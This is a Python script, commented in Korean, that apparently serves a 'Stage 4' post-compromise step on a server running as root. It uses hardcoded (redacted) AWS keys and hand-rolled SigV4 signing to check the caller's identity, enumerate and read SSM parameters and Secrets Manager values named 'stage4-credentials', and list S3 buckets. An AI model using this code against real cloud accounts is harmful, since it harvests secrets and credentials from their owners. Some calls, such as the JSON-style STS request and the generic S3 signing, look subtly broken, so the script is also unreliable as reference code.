#!/usr/bin/env python3
"""
Stage 4 정보 추출: AWS Parameter Store & Secrets Manager
서버에서 실행 (root 권한)
"""

import json
import urllib.request
import urllib.error
import hmac
import hashlib
import datetime
import sys
from urllib.parse import urlencode

# AWS 자격증명
AWS_ACCESS_KEY = "AKIA[REDACTED-ACCESS-KEY]"
AWS_SECRET_KEY = "[REDACTED-SECRET-KEY]"
AWS_REGION = "us-east-1"

def sign_aws_request(method, service, host, path, query_string, payload=""):
    """AWS SigV4 서명 생성"""

    t = datetime.datetime.utcnow()
    amz_date = t.strftime('%Y%m%dT%H%M%SZ')
    date_stamp = t.strftime('%Y%m%d')

    # Canonical request
    canonical_headers = f"host:{host}\nx-amz-date:{amz_date}\n"
    signed_headers = "host;x-amz-date"

    payload_hash = hashlib.sha256(payload.encode()).hexdigest()

    canonical_request = f"{method}\n{path}\n{query_string}\n{canonical_headers}\n{signed_headers}\n{payload_hash}"

    # String to sign
    canonical_request_hash = hashlib.sha256(canonical_request.encode()).hexdigest()
    credential_scope = f"{date_stamp}/{AWS_REGION}/{service}/aws4_request"
    string_to_sign = f"AWS4-HMAC-SHA256\n{amz_date}\n{credential_scope}\n{canonical_request_hash}"

    # Signature
    k_date = hmac.new(f"AWS4{AWS_SECRET_KEY}".encode(), date_stamp.encode(), hashlib.sha256).digest()
    k_region = hmac.new(k_date, AWS_REGION.encode(), hashlib.sha256).digest()
    k_service = hmac.new(k_region, service.encode(), hashlib.sha256).digest()
    k_signing = hmac.new(k_service, b"aws4_request", hashlib.sha256).digest()

    signature = hmac.new(k_signing, string_to_sign.encode(), hashlib.sha256).hexdigest()

    return amz_date, credential_scope, signature, signed_headers

def call_aws_api(service, method, target, payload=""):
    """AWS API 호출"""

    host = f"{service}.{AWS_REGION}.amazonaws.com"
    path = "/"
    query_string = ""

    amz_date, credential_scope, signature, signed_headers = sign_aws_request(
        method, service, host, path, query_string, payload
    )

    authorization = f"AWS4-HMAC-SHA256 Credential={AWS_ACCESS_KEY}/{credential_scope}, SignedHeaders={signed_headers}, Signature={signature}"

    url = f"https://{host}{path}"
    if query_string:
        url += f"?{query_string}"

    headers = {
        "Host": host,
        "X-Amz-Date": amz_date,
        "Authorization": authorization,
        "Content-Type": "application/x-amz-json-1.1",
        "X-Amz-Target": target,
    }

    try:
        req = urllib.request.Request(url, data=payload.encode() if payload else None, headers=headers, method=method)
        response = urllib.request.urlopen(req, timeout=5)
        return response.read().decode()
    except urllib.error.URLError as e:
        return f"Error: {e}"
    except Exception as e:
        return f"Error: {e}"

def main():
    print("=" * 60)
    print("Stage 4 AWS 정보 추출")
    print("=" * 60)
    print()

    # 1. STS GetCallerIdentity
    print("[*] 1. STS GetCallerIdentity (자격증명 유효성 확인)")
    print("-" * 60)
    result = call_aws_api("sts", "POST", "AWSIEServiceV20110615.GetCallerIdentity", "{}")
    try:
        data = json.loads(result)
        print(json.dumps(data, indent=2))
    except:
        print(result)
    print()

    # 2. SSM Parameter Store - /stage4 경로
    print("[*] 2. SSM Parameter Store - /stage4 경로")
    print("-" * 60)
    payload = json.dumps({"Path": "/stage4", "Recursive": True})
    result = call_aws_api("ssm", "POST", "AmazonSSM.DescribeParameters", payload)
    try:
        data = json.loads(result)
        print(json.dumps(data, indent=2))
    except:
        print(result)
    print()

    # 3. SSM GetParameter - stage4-credentials
    print("[*] 3. SSM GetParameter - stage4-credentials")
    print("-" * 60)
    payload = json.dumps({"Name": "stage4-credentials"})
    result = call_aws_api("ssm", "POST", "AmazonSSM.GetParameter", payload)
    try:
        data = json.loads(result)
        print(json.dumps(data, indent=2))
    except:
        print(result)
    print()

    # 4. Secrets Manager ListSecrets
    print("[*] 4. Secrets Manager - ListSecrets")
    print("-" * 60)
    result = call_aws_api("secretsmanager", "POST", "secretsmanager.ListSecrets", "{}")
    try:
        data = json.loads(result)
        print(json.dumps(data, indent=2))
    except:
        print(result)
    print()

    # 5. Secrets Manager GetSecretValue
    print("[*] 5. Secrets Manager - GetSecretValue (stage4)")
    print("-" * 60)
    payload = json.dumps({"SecretId": "stage4-credentials"})
    result = call_aws_api("secretsmanager", "POST", "secretsmanager.GetSecretValue", payload)
    try:
        data = json.loads(result)
        print(json.dumps(data, indent=2))
    except:
        print(result)
    print()

    # 6. S3 ListBuckets
    print("[*] 6. S3 ListBuckets")
    print("-" * 60)
    result = call_aws_api("s3", "GET", "", "")
    print(result[:500])  # 처음 500자만 출력
    print()

if __name__ == "__main__":
    main()
